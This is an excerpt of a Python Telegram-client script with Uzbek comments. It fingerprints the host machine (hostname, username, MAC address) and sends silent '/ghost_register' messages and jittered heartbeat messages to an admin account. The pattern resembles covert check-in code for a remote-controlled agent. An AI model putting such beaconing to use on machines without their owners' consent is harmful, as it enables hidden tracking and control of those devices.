...
# ==================== DEVICE REGISTRATION (v3.0.4 - SERVER INTEGRATION) ====================
async def register_device(client):
    """
    Qurilmani ro'yxatdan o'tkazish (Async)
    v3.0.4: Server botiga /ghost_register yuborish qo'shildi
    """
    try:
        import platform
        import uuid
        ...
        # To'liq device info (server uchun)
        device_info = {
            'hostname': hostname,
            'username': username,
            'os': platform.system(),
        ...
        try:
            mac = uuid.getnode()
            device_info['mac_address'] = ':'.join(['{:02x}'.format((mac >> i) & 0xff) for i in range(0, 48, 8)][::-1])
        except:
            device_info['mac_address'] = 'Unknown'
        
        # Unique fingerprint
        try:
            fingerprint_data = f"{hostname}|{platform.machine()}|{uuid.getnode()}"
            device_info['fingerprint'] = hashlib.md5(fingerprint_data.encode()).hexdigest()[:12]
        except:
            device_info['fingerprint'] = 'unknown'

        # Read devices file (local cache)
        devices = {}
        ...
        # === v3.0.4: SERVER BOTGA RO'YXATDAN O'TISH ===
        # Server bot /ghost_register command'ini qabul qiladi
        try:
            registration_data = {
                'device_id': device_id,
                'info': device_info,
            ...
            # Server botga /ghost_register xabari yuborish
            # Bot orqali o'ziga xabar yuborish
            register_message = f"/ghost_register {json.dumps(registration_data, ensure_ascii=False)}"
            
            # Bot o'ziga send qila olmaydi, shuning uchun bot_token orqali
            # Aslida server boshqa process'da ishlaydi - shuning uchun HTTP yoki
            # bot orqali ADMIN_ID ga yuboramiz, server uni ko'radi
            
            # ADMIN ga yuborish - server uni handle qiladi
            await client.send_message(ADMIN_ID, register_message, silent=True)
            logger.info(f"Server ga ro'yxatdan o'tish yuborildi: {device_id}")
            
        except Exception as server_err:
            logger.error(f"Server ga ro'yxatdan o'tish xatosi: {server_err}")
        
        # Admin ga xabar (faqat yangi qurilma bo'lsa)
        is_new = device_id not in devices or devices[device_id].get('first_seen') == now
        if ADMIN_ID and is_new:
            await client.send_message(
                ...
                f"💻 Host: `{hostname}`\n"
                f"📦 Versiya: `v{current_version}`"
            )
        logger.info(f"Qurilma ro'yxatga olindi: {device_id}")
        
        # === HEARTBEAT TASK BOSHLASH ===
...
async def heartbeat_loop(client, device_id):
    """
    Har 60 sekundda server ga heartbeat yuborish
    v3.0.4: Server device'ni online deb belgilaydi
    """
    import random
    
    # Boshlang'ich kechikish (server ishga tushguncha)
    ...
    while True:
        try:
            ...
            heartbeat_message = f"/ghost_heartbeat {json.dumps(heartbeat_data)}"
            
            # Server ga heartbeat yuborish (silent)
            await client.send_message(ADMIN_ID, heartbeat_message, silent=True)
            logger.debug(f"Heartbeat yuborildi: {device_id}")
            
        except Exception as e:
            logger.error(f"Heartbeat xatosi: {e}")
        
        # 55-65 sekund oralig'ida random (server overload'dan saqlash)
        await asyncio.sleep(55 + random.randint(0, 10))
